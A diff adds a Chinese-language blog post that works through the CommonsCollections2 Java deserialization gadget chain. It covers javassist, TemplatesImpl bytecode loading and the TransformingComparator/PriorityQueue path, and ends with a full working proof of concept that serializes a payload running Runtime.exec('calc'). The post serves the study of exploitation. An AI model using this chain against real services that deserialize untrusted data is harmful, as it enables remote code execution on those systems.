@@ -1,0 +1,534 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="sp4z">
+  <meta name="keywords" content="">
+  
+  <title>CommonsCollections2利用链学习 - sp4z&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="CommonsCollections2利用链学习">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-07-08 22:49" pubdate>
+        2021年7月8日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2.2k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      34
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">CommonsCollections2利用链学习</h1>
+            
+            <div class="markdown-body">
+              <h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>依赖commmonscollections4（3.1中TransformingComparator没有继承自Serializable所以无法进行Java反序列化）</p>
+<p>pom.xml</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"> <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.commons<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections4<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.javassist<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javassist<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.25.0-GA<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="javasist"><a href="#javasist" class="headerlink" title="javasist"></a>javasist</h2><p>用于生成字节码</p>
+<p>先在pom.xml添加依赖</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.javassist<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javassist<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.25.0-GA<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>demo</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">JavassistTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br><br>        <span class="hljs-comment">//ClassPool是一个CtClass对象的容器，一个CtClass必须从中进行获取，ClassPool.getDefault()返回默认的类池</span><br>        ClassPool pool = ClassPool.getDefault();<br>        <span class="hljs-comment">//添加类搜索路径</span><br>        pool.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>        <span class="hljs-comment">//创建名为Evil的类</span><br>        CtClass test = pool.makeClass(<span class="hljs-string">&quot;Evil&quot;</span>);<br>        String name = <span class="hljs-string">&quot;Evil&quot;</span> + System.nanoTime();<br>        test.setName(name);<br>        <span class="hljs-comment">//定义要插入的字节码</span><br>        String cmd = <span class="hljs-string">&quot;System.out.println(\&quot;Hello,Javasist\&quot;);&quot;</span>;<br>        <span class="hljs-comment">//设置要继承的类</span><br>        test.setSuperclass(pool.get(AbstractTranslet.class.getName()));<br>        <span class="hljs-comment">//创建一个空的类初始化器（静态构造函数）</span><br>        CtConstructor constructor = test.makeClassInitializer();<br>        <span class="hljs-comment">//将字节码插入到开头</span><br>        constructor.insertBefore(cmd);<br>        <span class="hljs-comment">//将编译的类创建为`.class` 文件</span><br>        test.writeFile(<span class="hljs-string">&quot;./&quot;</span>);<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+
+
+<p>可以看到生成了一个class文件</p>
+<p><a href="https://imgtu.com/i/Rj9r6K"><img src="https://z3.ax1x.com/2021/07/09/Rj9r6K.png" srcset="/img/loading.gif" lazyload alt="Rj9r6K.png"></a></p>
+<p>.class文件的内容</p>
+<p><a href="https://imgtu.com/i/Rj9Dl6"><img src="https://z3.ax1x.com/2021/07/09/Rj9Dl6.png" srcset="/img/loading.gif" lazyload alt="Rj9Dl6.png"></a></p>
+<h2 id="ClassLoader-defineClass"><a href="#ClassLoader-defineClass" class="headerlink" title="ClassLoader#defineClass"></a>ClassLoader#defineClass</h2><p>ClassLoader是Java的类加载器，主要用于加载字节码</p>
+<p>利用类加载器的defineClass方法来加载字节码，但是由于ClassLoader#defineClass方法是protected所以无法直接从外部进行调用，只能通过反射来调用这个方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">Class clas = Class.forName(<span class="hljs-string">&quot;java.lang.ClassLoader&quot;</span>);<br>        Method defineclass = clas.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, String.class, <span class="hljs-keyword">byte</span>[].class, <span class="hljs-keyword">int</span>.class, <span class="hljs-keyword">int</span>.class);<br>        defineclass.setAccessible(<span class="hljs-keyword">true</span>);<br>        Class claz = (Class) defineclass.invoke(ClassLoader.getSystemClassLoader(),<span class="hljs-string">&quot;Evil&quot;</span>,bytes,<span class="hljs-number">0</span>,bytes.length);<br>        claz.newInstance();<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h2><p>在TemplatesImpl类中定义了一个内部类TransletClassLoader，在这个类中对loadClass进行了重写并且可以被外部进行调用，可以被用来加载字节码</p>
+<p>两个要求</p>
+<ol>
+<li>要利用反射设置这四个属性</li>
+<li>javasist生成的代码要继承自<code>AbstractTranslet</code></li>
+</ol>
+<p>利用TemplatesImpl来加载字节码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.*;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TemplatesTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        ClassPool pool = ClassPool.getDefault();<br>        pool.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>        CtClass clas = pool.makeClass(<span class="hljs-string">&quot;TempTest&quot;</span>);<br><br>        clas.setSuperclass(pool.get(AbstractTranslet.class.getName()));<br><br>        String cmd = <span class="hljs-string">&quot;System.out.println(\&quot;Templates Test\&quot;);&quot;</span>;<br>        CtConstructor constructor = clas.makeClassInitializer();<br>        constructor.insertBefore(cmd);<br>        clas.writeFile(<span class="hljs-string">&quot;./&quot;</span>);<br><br>        <span class="hljs-keyword">byte</span>[] bytes = clas.toBytecode();<br><br>        TemplatesImpl templates = TemplatesImpl.class.newInstance();<br><br>        Class temp = Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);<br>        Field _name = temp.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        _name.setAccessible(<span class="hljs-keyword">true</span>);<br>        _name.set(templates,<span class="hljs-string">&quot;tttt&quot;</span>);<br>        setFieled(templates,temp,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;tttt&quot;</span>);<br>        setFieled(templates,temp,<span class="hljs-string">&quot;_class&quot;</span>,<span class="hljs-keyword">null</span>);<br>        setFieled(templates,temp,<span class="hljs-string">&quot;_bytecodes&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;bytes&#125;);<br>        setFieled(templates,temp,<span class="hljs-string">&quot;_tfactory&quot;</span>,<span class="hljs-keyword">new</span> TransformerFactoryImpl());<br><br>        templates.getOutputProperties();<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieled</span><span class="hljs-params">(TemplatesImpl templates,Class clas ,String fieled,Object obj)</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br>        Field _field = clas.getDeclaredField(fieled);<br>        _field.setAccessible(<span class="hljs-keyword">true</span>);<br>        _field.set(templates,obj);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+
+
+<p><a href="https://imgtu.com/i/Rj9BSx"><img src="https://z3.ax1x.com/2021/07/09/Rj9BSx.png" srcset="/img/loading.gif" lazyload alt="Rj9BSx.png"></a></p>
+<p>成功加载了生成的class文件</p>
+<p><a href="https://imgtu.com/i/Rj9sOO"><img src="https://z3.ax1x.com/2021/07/09/Rj9sOO.png" srcset="/img/loading.gif" lazyload alt="Rj9sOO.png"></a></p>
+<p>触发过程</p>
+<p><a href="https://imgtu.com/i/Rj96mD"><img src="https://z3.ax1x.com/2021/07/09/Rj96mD.png" srcset="/img/loading.gif" lazyload alt="Rj96mD.png"></a></p>
+<h3 id="为什么要先用反射设置属性？"><a href="#为什么要先用反射设置属性？" class="headerlink" title="为什么要先用反射设置属性？"></a>为什么要先用反射设置属性？</h3><p>在getTransletInstance中，需要满足条件<code>_name!==null</code>和<code>_class==null</code>才能进入defineTransletClasses</p>
+<p><a href="https://imgtu.com/i/Rj9c0e"><img src="https://z3.ax1x.com/2021/07/09/Rj9c0e.png" srcset="/img/loading.gif" lazyload alt="Rj9c0e.png"></a></p>
+<p>进入defineTransletClasses，<code>_bytecodes</code>的值为被加载的字节码</p>
+<p><a href="https://imgtu.com/i/Rj9Rkd"><img src="https://z3.ax1x.com/2021/07/09/Rj9Rkd.png" srcset="/img/loading.gif" lazyload alt="Rj9Rkd.png"></a></p>
+<h3 id="为什么javasist生成的代码要继承自AbstractTranslet？"><a href="#为什么javasist生成的代码要继承自AbstractTranslet？" class="headerlink" title="为什么javasist生成的代码要继承自AbstractTranslet？"></a>为什么javasist生成的代码要继承自AbstractTranslet？</h3><p>defineTransletClasses中存在对父类的判断，父类不是ABSTRACT_TRANSLET的时候会报错。所以在生成字节码的时候需要设置父类</p>
+<p><a href="https://imgtu.com/i/Rj9gTH"><img src="https://z3.ax1x.com/2021/07/09/Rj9gTH.png" srcset="/img/loading.gif" lazyload alt="Rj9gTH.png"></a></p>
+<h1 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h1><h2 id="TransformingComparator"><a href="#TransformingComparator" class="headerlink" title="TransformingComparator"></a>TransformingComparator</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p><code>org.apache.commons.collections4.comparators.TransformingComparator#compare</code></p>
+<p>漏洞起点是<code>TransformingComparator.compare()</code>，其中触发了<code>transform</code>方法</p>
+<p><a href="https://imgtu.com/i/Rj9WtA"><img src="https://z3.ax1x.com/2021/07/09/Rj9WtA.png" srcset="/img/loading.gif" lazyload alt="Rj9WtA.png"></a></p>
+<p><code>org.apache.commons.collections4.comparators.TransformingComparator#TransformingComparator</code></p>
+<p><code>this.transformer</code>可控，来源于构造函数中传入的<code>transform</code>参数</p>
+<p><a href="https://imgtu.com/i/Rj9ffI"><img src="https://z3.ax1x.com/2021/07/09/Rj9ffI.png" srcset="/img/loading.gif" lazyload alt="Rj9ffI.png"></a></p>
+<p>接下来就跟之前一样了，由于我们可以调用任意类的transform方法，只需在构造方法中传入构造好的<code>ChainedTransforme</code>然后触发反射链执行命令</p>
+<p><a href="https://imgtu.com/i/Rj94pt"><img src="https://z3.ax1x.com/2021/07/09/Rj94pt.png" srcset="/img/loading.gif" lazyload alt="Rj94pt.png"></a></p>
+<p>接下来我们需要找到能触发<code>TransformingComparator.compare()</code>并 且传入参数可控的点</p>
+<p>条件:</p>
+<ol>
+<li>能触发<code>TransformingComparator.compare()</code></li>
+<li>传入<code>compare</code>函数的参数可控，这样才能传入<code>ChainedTransformer</code>执行反射链</li>
+</ol>
+<h2 id="PriorityQueue-执行命令"><a href="#PriorityQueue-执行命令" class="headerlink" title="PriorityQueue(执行命令)"></a>PriorityQueue(执行命令)</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p><code>java.util.PriorityQueue#readObject</code></p>
+<p>这里对传入参数ObjectInputStream进行反序列化，然后赋值给queue数组</p>
+<p><a href="https://imgtu.com/i/Rj951P"><img src="https://z3.ax1x.com/2021/07/09/Rj951P.png" srcset="/img/loading.gif" lazyload alt="Rj951P.png"></a></p>
+<p>queue是属性，可以使用反射修改它，所以queue可控</p>
+<p><a href="https://imgtu.com/i/Rj9b7Q"><img src="https://z3.ax1x.com/2021/07/09/Rj9b7Q.png" srcset="/img/loading.gif" lazyload alt="Rj9b7Q.png"></a></p>
+<p><code>java.util.PriorityQueue#heapify</code></p>
+<p>接下来进入 <code>heapify()</code> 函数，这里的queue跟上面一样，也是可控的</p>
+<p><a href="https://imgtu.com/i/Rj9I6f"><img src="https://z3.ax1x.com/2021/07/09/Rj9I6f.png" srcset="/img/loading.gif" lazyload alt="Rj9I6f.png"></a></p>
+<p><code>java.util.PriorityQueue#siftDown</code></p>
+<p>继续来看 <code>siftDown()</code> 函数，如果comparator不为null，那么就会进入<code>siftDownUsingComparator()</code> 函数，此时x可控</p>
+<p><a href="https://imgtu.com/i/Rj9oX8"><img src="https://z3.ax1x.com/2021/07/09/Rj9oX8.png" srcset="/img/loading.gif" lazyload alt="Rj9oX8.png"></a></p>
+<p><code>java.util.PriorityQueue#siftDownUsingComparator</code></p>
+<p>调用comparator的compare函数, 这里的 <code>x</code> 就是上面传进来的queue，是可控的。利用反射让<code>comparator</code>等于<code>TransformingComparator</code>就可以调用<code>TransformingComparator.compare()</code>。同时x可控，这样就可以利用 <code>InvokerTransformer</code> 触发任意类的任意方法。</p>
+<p><a href="https://imgtu.com/i/Rj97nS"><img src="https://z3.ax1x.com/2021/07/09/Rj97nS.png" srcset="/img/loading.gif" lazyload alt="Rj97nS.png"></a></p>
+<p>poc</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br>        <br>        <span class="hljs-comment">//构造ChainedTransformer</span><br>        ChainedTransformer chain = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[] &#123;<br>            <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[] &#123;<br>                String.class, Class[].class &#125;, <span class="hljs-keyword">new</span> Object[] &#123;<br>                <span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>] &#125;),<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[] &#123;<br>                Object.class, Object[].class &#125;, <span class="hljs-keyword">new</span> Object[] &#123;<br>                <span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>] &#125;),<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<br>                <span class="hljs-keyword">new</span> Class[] &#123; String.class &#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)&#125;);<br>        <br>        <span class="hljs-comment">//通过构造函数给this.transformer赋值</span><br>        TransformingComparator transformingComparator = <span class="hljs-keyword">new</span> TransformingComparator(chain);<br>        <span class="hljs-comment">//也可通过构造函数直接进行传入</span><br>        <span class="hljs-comment">//PriorityQueue queue = new PriorityQueue(1,transformingComparator);</span><br><br>        PriorityQueue queue = <span class="hljs-keyword">new</span> PriorityQueue(<span class="hljs-number">1</span>);<br>        queue.add(<span class="hljs-number">1</span>);<br>        queue.add(<span class="hljs-number">2</span>);<br><br>        <span class="hljs-comment">//利用反射给comparator赋值为 TransformingComparator，触发TransformingComparator.compare()</span><br>        Field field = Class.forName(<span class="hljs-string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);<br>        field.setAccessible(<span class="hljs-keyword">true</span>);<br>        field.set(queue,transformingComparator);<br><br>        <span class="hljs-keyword">try</span>&#123;<br>            ObjectOutputStream outputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(<span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;evil.bin&quot;</span>));<br>            outputStream.writeObject(queue);<br>            outputStream.close();<br><br>            ObjectInputStream inputStream = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;evil.bin&quot;</span>));<br>            inputStream.readObject();<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+
+
+<p>可以执行命令</p>
+<p><a href="https://imgtu.com/i/Rj9x10"><img src="https://z3.ax1x.com/2021/07/09/Rj9x10.png" srcset="/img/loading.gif" lazyload alt="Rj9x10.png"></a></p>
+<p>流程</p>
+<p><a href="https://imgtu.com/i/Rj9Ots"><img src="https://z3.ax1x.com/2021/07/09/Rj9Ots.png" srcset="/img/loading.gif" lazyload alt="Rj9Ots.png"></a></p>
+<h3 id="为什么这里queue要添加两个元素？"><a href="#为什么这里queue要添加两个元素？" class="headerlink" title="为什么这里queue要添加两个元素？"></a>为什么这里queue要添加两个元素？</h3><p>如果只添加一个的话，最终结果会为-1从而无法进入siftDown函数</p>
